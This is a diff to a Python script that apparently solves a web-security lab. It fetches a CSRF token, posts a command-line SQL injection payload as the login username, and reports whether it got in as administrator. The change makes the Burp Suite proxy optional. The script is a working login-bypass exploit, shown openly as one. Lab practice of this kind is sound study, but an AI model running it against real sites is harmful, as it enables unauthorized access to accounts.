@@ -3,8 +3,11 @@ import requests
 from bs4 import BeautifulSoup
 import urllib3
 
-proxy = {"http": "http://127.0.0.1:8800", "https": "http://127.0.0.1:8800"}
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# if u want to use burp suite as proxy to see all requests. Default on.
+use_proxy = True
+proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 
 def create_csrf_token(session: requests.Session, url: str) -> str:
@@ -14,7 +17,10 @@ def create_csrf_token(session: requests.Session, url: str) -> str:
     :param url: url
     :return: csrf token
     """
-    request_to_get_csrf_token = session.get(url, verify=False, proxies=proxy)
+    if use_proxy:
+        request_to_get_csrf_token = session.get(url, verify=False, proxies=proxy)
+    else:
+        request_to_get_csrf_token = session.get(url)
     soup = BeautifulSoup(request_to_get_csrf_token.text, "html.parser")
     csrf_token = soup.find("input")["value"]
     return csrf_token
@@ -30,14 +36,20 @@ def exploit_sql_injection(session: requests.Session, url: str, payload: str) -> 
     """
     csrf_token = create_csrf_token(session, url)
     data = {"csrf": csrf_token, "username": payload, "password": "randomtext"}
-    request_to_check_exploit = session.post(url, data=data, verify=False, proxies=proxy)
+    if use_proxy:
+        request_to_check_exploit = session.post(url, data=data, verify=False, proxies=proxy)
+    else:
+        request_to_check_exploit = session.post(url, data=data)
     result = request_to_check_exploit.text
     if "Log out" in result:
         return True
     return False
 
-
-if __name__ == "__main__":
+def main() -> None:
+    """
+    Main function
+    :return: None
+    """
     try:
         url = sys.argv[1].strip()
         sql_injection_payload = sys.argv[2].strip()
@@ -50,3 +62,6 @@ if __name__ == "__main__":
         print("[+] SQL injections successful. I log in as administrator")
     else:
         print("[-] SQL injections unsuccessful")
+
+if __name__ == "__main__":
+    main()
